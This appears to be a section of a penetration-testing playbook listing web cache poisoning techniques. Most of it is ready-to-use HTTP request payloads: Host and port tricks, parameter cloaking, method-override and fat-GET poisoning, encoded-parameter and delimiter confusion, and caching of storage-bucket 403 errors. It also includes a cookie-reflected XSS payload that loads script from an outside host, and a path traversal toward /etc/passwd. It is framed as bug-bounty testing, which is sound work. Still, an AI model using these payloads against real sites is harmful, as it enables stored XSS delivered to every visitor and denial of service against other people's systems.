# 05 — Implementation-Flaw Attacks (Key-Generation & Forwarding Discrepancies)

Distinct key-generation bugs. Probe each in Phase B; each maps to a payload here.

## A. Unkeyed port
`Host: target.com:1337` — cache drops port, origin keeps it → redirect to dead socket (DoS) or, with non-numeric ports, payload injection.

## B. Full query string excluded
See ref 04-A. Alt busters when query is unkeyed: `Accept-Encoding: …,cachebuster` · `Accept: */*, text/cachebuster` · `Cookie: cachebuster=1` · `Origin: https://cachebuster.target.com`. Reflected XSS in a query param then poisons the bare path.

## C. Path-splitting discrepancies
| Tech | Payload | Behavior |
|------|---------|----------|
| Apache | `GET //path` | normalizes to `/path` |
| Nginx | `GET /%2Fpath` | normalizes to `/path` |
| PHP | `GET /index.php/xyz` | ignores extra path |
| .NET | `GET /(A(xyz))/` | session-based path parsing |

## D. Parameter cloaking
- Malformed query: `GET /?example=123?excluded_param=bad` — cache sees a separate excluded var; server reads one long value.
- Semicolon mismatch: `GET /?keyed=abc&excluded=123;keyed=bad` — cache keeps first `keyed`, backend honors last (`;` delimiter). Target JSONP `?callback=…`.

## E. Fat GET / method override
`GET /?param=innocent` + body `param=bad` (see ref 04-D). Or header `X-HTTP-Method-Override: POST`.

### E2. Method-override poisoning (GitLab/GCS #1160407)
```
GET /static/app.js
X-HTTP-Method-Override: HEAD    → GCS returns 200 Content-Length:0; cache stores empty body under GET key → JS/CSS DoS
```
Detect: does the cache distinguish GET vs HEAD? If not, any override poisons static assets. (Also check `PURGE` unblocked → clear + re-poison live entries.)

## F. Resource-import poisoning
`GET /style.css?excluded=alert(1)%0A{}*{color:red;}` — stylesheet echoes excluded var → CSS injection.

### F2. Reflected cookie → jQuery `$.getScript` (WAF bypass)
```
GET /resource.otf?cb=1
Cookie: n_vis=xssx'*$.getScript`//593.xss.ht`//;
```
Cookie reflected in a `<script>` block; jQuery runs the backtick payload → stored XSS without `<script>` tags. Test reflection in **every** header/cookie/custom field/`X-Forwarded-*`.

## G. Key-normalization weakness (encoding discrepancy)
`/example?param="><test>` vs `/example?param=%22%3e%3ctest%3e` share a key if the cache decodes → store unencoded payload, victims sending encoded still hit it (ref 04-E).

## H. Cache-key injection
`Origin: '-alert(1)-'__` — poor composite-key escaping (ref 04-F).

## I. Poisoning internal/fragment caches
Signs: blended prior-request input; reflections on un-injected pages; path-inconsistent behavior. Standard busters often fail — use attacker-owned domains only (ref 04-H).

## J. Capitalized Host header
`Host: TARGET.COM` — cache lowercases for key, origin gets original casing → different page (vhost mismatch/debug/redirect) cached for all. (CF/Fastly patched defaults; custom Varnish/old stacks remain.)

## K. Fastly-Host cross-origin poisoning
```
GET /test.html  Host: redacted-cdn.com
Fastly-host: assets.redacted.com   → key built for assets.redacted.com, origin serves redacted-cdn.com → DOM-XSS cached on benign host
```

## L. Encoded duplicate-parameter keyed injection
```
GET /images/logo.png?size=32x32&siz%65=0   → cache keys size=32x32; backend decodes %65→e → size=0 → 400 cached under legit key → image DoS
```
Generalizes to any param whose name is decoded only at the backend.

## M. Storage-bucket Authorization poisoning
S3/Azure behind a CDN that caches 403:
```
GET /static/main.js  Authorization: AWS4-HMAC-SHA256 Credential=…   → S3 403 cached (CF pre-2021-08-03 default) → asset DoS
GET /file.zip        Authorization: SharedKeyLite myaccount: …      → Azure 403 cached → download DoS (Exodus $2,500)
```

## Arbitrary-key manipulation (Section 6 of source)
- **Mapping discrepancy (origin doesn't normalize):** `GET /hello/..%2f/home` — cache→`/home`, origin keeps raw; a reflecting 404 poisons `/home`.
- **Backend delimiter key control:** `/profile;/../home` — origin runs `/profile`, cache stores under `/home`.
- **Frontend delimiter key control:** `/evil#/../../home` — Azure `#` delimiter → stores under `/home`.
- **Backslash normalization (Shopify #1695604):** `GET /admin\dashboard` — cache→`/admin/dashboard`, origin keeps `\` → 404 cached under the legit path → DoS. Test `\`, `%5C`, encoded variants.
- **URL-fragment (ATS CVE-2021-27577):** `GET /index.html#/../admin` — cache key `/index.html`, ATS forwards the fragment; proxies encode `#`→`%23` → `/admin` response cached under `/index.html`. Also `GET /static/main.js#/../../../../etc/passwd`. Fragments are dropped by real browsers → use `%23` or a proxy.
